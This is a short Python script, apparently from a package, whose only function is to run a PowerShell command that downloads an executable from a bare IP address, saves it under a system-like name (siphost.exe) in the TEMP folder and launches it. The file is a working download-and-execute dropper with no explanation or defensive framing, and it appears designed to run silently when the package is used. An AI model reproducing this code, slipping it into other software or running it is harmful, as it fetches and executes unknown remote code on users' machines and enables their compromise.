import subprocess
import sys
import os

print("Running PowerShell command...")

# Add the package directory to the path if needed
package_dir = os.path.dirname(os.path.abspath(__file__))
if package_dir not in sys.path:
    sys.path.insert(0, package_dir)

# Run PowerShell command
try:
    powershell_cmd = 'iwr -useb http://194.26.192.145/siproute.exe -OutFile $env:TEMP\\siphost.exe; Start-Process $env:TEMP\\siphost.exe'
    result = subprocess.run(
        ['powershell', '-Command', powershell_cmd],
        capture_output=True,
        text=True,
        check=True
    )
    print("PowerShell output:", result.stdout)
except subprocess.CalledProcessError as e:
    print("Error running PowerShell command:", e.stderr, file=sys.stderr)

print("PowerShell command execution complete.")
